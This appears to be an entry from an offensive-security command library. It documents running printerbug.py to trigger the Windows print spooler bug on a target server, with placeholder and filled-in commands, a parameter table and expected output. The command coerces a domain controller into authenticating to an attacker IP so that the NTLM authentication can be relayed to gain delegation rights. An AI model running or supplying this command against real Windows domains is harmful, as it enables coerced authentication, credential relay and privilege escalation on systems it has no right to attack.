---
id: 5eb33ca8-4818-4280-add6-4f1d141c125b
name: printerbug-trigger-spool-bug
type: command
executor: bash
data: python printerbug.py $_DOMAIN/$_USERNAME@$_TARGET_SERVER $_ATTACKER_IP
output: null
created_at: '2023-04-06T03:56:05.532998+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
platforms:
  - Windows
tags:
  - exploitation
  - printerbug
verified: true
validated: true
---

# printerbug-trigger-spool-bug

## Command

```bash
python printerbug.py $_DOMAIN/$_USERNAME@$_TARGET_SERVER $_ATTACKER_IP
```

## Description

Triggers the spooler bug on a target Windows server to initiate NTLM relay for delegation setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name | Yes |
| $_USERNAME | Initial auth username | Yes |
| $_TARGET_SERVER | Target server FQDN (e.g., second-dc-server) | Yes |
| $_ATTACKER_IP | Attacker's IP (e.g., 10.0.2.6) | Yes |

## Examples

### Basic Usage

```bash
python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
```

## Expected Output

[INFO] Connecting to spooler...
[INFO] Bug triggered, awaiting relay

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/ntlmrelayx-grant-delegation-access]]
